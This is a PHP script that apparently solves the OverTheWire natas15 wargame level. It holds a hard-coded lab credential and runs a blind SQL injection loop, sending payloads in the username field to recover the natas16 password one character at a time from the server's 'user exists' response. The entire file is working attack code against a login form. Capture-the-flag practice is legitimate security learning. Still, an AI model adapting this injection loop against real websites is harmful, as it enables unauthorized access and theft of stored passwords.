<?php

$pp = "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J";
$l = strlen($pp);
$s = '';

$headers = array("Authorization: Basic ". base64_encode("natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"));
$url = "http://natas15.natas.labs.overthewire.org/";

$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_RETURNTRANSFER,true);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
curl_setopt($curl, CURLOPT_COOKIEJAR, 'cookies.txt');
curl_setopt($curl, CURLOPT_COOKIEFILE, 'cookies.txt');
$out = curl_exec($curl);

echo "Brute-force password for natas16 (blind-based SQL injection):...\n";
for ($j=1; $j <= $l; $j++) {
    for ($i=48; $i < 123; $i++) { 
        $url = "http://natas15.natas.labs.overthewire.org/index.php?debug";
        curl_setopt($curl, CURLOPT_URL, $url);
        curl_setopt($curl, CURLOPT_POST, 1);
        curl_setopt($curl, CURLOPT_COOKIEJAR, 'cookies.txt');
        curl_setopt($curl, CURLOPT_COOKIEFILE, 'cookies.txt');
        curl_setopt($curl, CURLOPT_POSTFIELDS, "username=natas16\" AND BINARY SUBSTRING(password," . $j . ",1)=\"". chr($i));
        $out = curl_exec($curl);
        #echo $out;
        if (strpos($out,"This user exists") > 0) {
            $s .= chr($i);
            echo "\r$s";
            break;
        }
    }
}
curl_close($curl);

